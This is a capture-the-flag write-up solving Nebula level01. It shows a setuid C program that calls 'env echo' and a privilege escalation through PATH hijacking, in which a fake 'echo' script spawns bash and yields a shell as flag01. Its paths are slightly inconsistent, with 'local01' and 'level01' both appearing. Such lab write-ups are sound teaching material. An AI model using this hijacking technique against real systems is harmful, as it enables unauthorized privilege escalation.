# For level01 in nebula

>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
>  
>To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01.

### The program
```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();	//Euid is flag01

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);		//set ruid, suid, euid to flag01

  system("/usr/bin/env echo and now what?");	//run echo 'and now what?'
}
```

Running it gives us
```
level01@nebula:~$ cd /home/flag01
level01@nebula:/home/flag01$ ls
flag01
level01@nebula:/home/flag01$ ./flag01 
and now what?
```

Our goal, similar in `level00`, is to become `flag01` and execute `getflag`. Our program has already set our real, effective and saved UID and GID to `flag01`. How do we set our real UID to `flag01`? 

>The real and effective UID and GID of the child process are equal to the real and effective UID and GID of the parent process. [Source](https://stackoverflow.com/questions/17785983/ruid-euid-after-exec)

Since the real UID of this C program is already `flag01`, the real UID of its child processes will also be `flag01`. So, why don't we spawn a shell using this program?



### Crafting the exploit

Let's create a simple bash script that calls `bash`. All we have to do is just to redirect the C program to it.
```
#!/bin/bash

bash;
```

This is where a new concept comes in: Environment variables. 

>PATH is an environment variable on Unix-like operating systems, DOS, OS/2, and Microsoft Windows, specifying a set of directories where executable programs are located. In general, each executing process or user session has its own PATH setting.

```
level01@nebula:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
level01@nebula:~$
```
When we call `echo` for instance, Linux looks for the program in `/user/local/sbin`. If it isn't there, it looks at `/user/local/bin`, and so on. 

We shall trick Linux into thinking our program *is* the `echo` program.

1. We name the script above `echo` and place it in `/home/local01` where we have write permissions. Make sure to `chmod +x echo` so we can execute it!

2. We add `/home/local01` into the $PATH environment variable with this instruction `export PATH=/home/level01:$PATH` so Linux will look for `echo` there.

Let's verify the `$PATH` before we run the C program.
```
level01@nebula:~$ echo $PATH
/home/level01:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
```
After running the C program, we got a bash shell where we are now `flag01` and can execute `getflag`.
```
level01@nebula:/home/flag01$ ./flag01 
flag01@nebula:/home/flag01$ getflag
You have successfully executed getflag on a target account
flag01@nebula:/home/flag01$ whoami
flag01
```

END
